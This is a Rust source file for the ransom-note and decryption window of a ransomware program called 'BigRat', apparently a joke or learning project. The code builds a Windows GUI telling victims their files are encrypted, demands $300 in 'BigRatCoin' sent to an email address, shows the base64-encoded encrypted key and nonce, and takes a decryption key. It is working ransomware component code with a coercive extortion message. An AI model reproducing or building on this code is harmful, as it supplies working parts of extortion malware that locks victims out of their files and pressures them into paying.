mod decryption_dialog;

extern crate native_windows_gui as nwg;
extern crate native_windows_derive as nwd;

use std::cell::RefCell;
use std::path::PathBuf;
use std::thread;
use anyhow::{Context, Result};
use base64::Engine;
use nwd::NwgUi;
use nwg::{Font, NativeUi};
use indoc::indoc;
use crate::decryptor_gui::decryption_dialog::{DecryptionDialog, DecryptionError};
use crate::status_file::StatusData;

const BIGRAT_SIDEBAR: &[u8; 576138] = include_bytes!("sidebar.bmp");
const SIDEBAR_WIDTH: i32 = 240;
const CONTENT_H_START: i32 = SIDEBAR_WIDTH + 10;
const MAX_CONTENT_WIDTH: i32 = 800 - CONTENT_H_START - 10;

#[derive(Default, NwgUi)]
pub struct Decryptor {
    #[nwg_control(
        title: "BigRat Decryptor",
        size: (800, 600),
        center: true,
        flags: "WINDOW|VISIBLE",
    )]
    #[nwg_events(OnWindowClose: [Decryptor::on_close(SELF, EVT_DATA)])]
    window: nwg::Window,

    #[nwg_control]
    #[nwg_events(OnNotice: [Decryptor::on_decryption_finish])]
    decryption_end_notice: nwg::Notice,
    decryption_dialog_thread: RefCell<Option<thread::JoinHandle<Result<(), DecryptionError>>>>,
    working_path: PathBuf,
    status_data: StatusData,

    #[nwg_resource(source_bin: Some(BIGRAT_SIDEBAR.as_slice()))]
    bigrat_sidebar: nwg::Bitmap,

    #[nwg_control(size: (SIDEBAR_WIDTH, 600), bitmap: Some(&data.bigrat_sidebar))]
    bigrat_img: nwg::ImageFrame,

    #[nwg_control(
        text: "Oh no! Your files have been encrypted!",
        position: (CONTENT_H_START, 10),
        size: (MAX_CONTENT_WIDTH, 40),
        v_align: nwg::VTextAlign::Center,
        h_align: nwg::HTextAlign::Center,
    )]
    title: nwg::Label,

    #[nwg_control(
        text: indoc! {"
            ## What happened to my computer?\r
            Your important files are encrypted.\r
            Many of your documents, photos, videos, databases and other files are no longer accessible because they \
            have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. \
            Nobody can recover your files without our decryption service.\r
            \r
            ## Can I recover my files?\r
            Sure. We guarantee that you can recover all your files safely and easily.\r
            Scroll down and at the bottom you'll see a bunch of seemingly senseless letters and numbers. This is an \
            encrypted key, that you need to copy and send to the attached email address together with $300 worth of \
            BigRatCoin cryptocurrency.\r
            You'll get back a decryption key that you need to paste into the input box below and click the 'Decrypt' button.\r
            \r
            ## Is this a joke?\r
            No. Your files are seriously encrypted. Those Big Rats are this big, because they contain your encrypted files. \
            If you don't believe it, you can send us one of them, we'll decrypt it and send back to you. \r
            \r
            ## Encrypted key\r
            Send it to bigratware@example.com\r
            \r
        "},
        position: (CONTENT_H_START, 40),
        size: (MAX_CONTENT_WIDTH, 480),
        flags: "VSCROLL|VISIBLE",
        readonly: true,
    )]
    info_box: nwg::TextBox,

    #[nwg_control(
        text: "",
        position: (CONTENT_H_START, 530),
        size: (MAX_CONTENT_WIDTH, 25),
    )]
    decryptor_key_input: nwg::TextInput,

    #[nwg_control(
        text: "Decrypt",
        position: (CONTENT_H_START, 560),
        size: (100, 30)
    )]
    #[nwg_events(OnButtonClick: [Decryptor::decrypt])]
    decrypt_btn: nwg::Button,
}

impl Decryptor {
    fn decrypt(&self) {
        *self.decryption_dialog_thread.borrow_mut() = Some(DecryptionDialog::open(
            self.decryption_end_notice.sender(),
            self.decryptor_key_input.text(),
            self.working_path.clone(),
            self.status_data.clone(),
        ));
    }

    fn on_decryption_finish(&self) {
        if self.decryption_dialog_thread.take().unwrap().join().unwrap().is_ok() {
            nwg::stop_thread_dispatch();
        }
    }

    fn on_close(&self, data: &nwg::EventData) {
        // if the dialog is still open
        if match self.decryption_dialog_thread.try_borrow() {
            Ok(thread) => thread.is_some(),
            Err(_) => true,
        } {
            if let nwg::EventData::OnWindowClose(close_data) = data {
                close_data.close(false);
            }
        } else {
            nwg::stop_thread_dispatch();
        }
    }
}


pub fn start_decryptor_gui(status_data: StatusData, working_path: PathBuf) -> Result<()> {
    nwg::init().with_context(|| "Failed to init Native Windows GUI")?;

    if let Err(e) = Font::set_global_family("Segoe UI") {
        eprintln!("Failed to set the global font: {e}");
    }

    let window = Decryptor::build_ui(Decryptor {
        working_path,
        status_data,
        ..Default::default()
    }).with_context(|| "Failed to build UI")?;

    let pair_b64 = base64::engine::general_purpose::STANDARD_NO_PAD
        .encode([window.status_data.encrypted_key, window.status_data.encrypted_nonce].concat());
    window.info_box.set_text(&(window.info_box.text() + &pair_b64));

    nwg::dispatch_thread_events();

    Ok(())
}
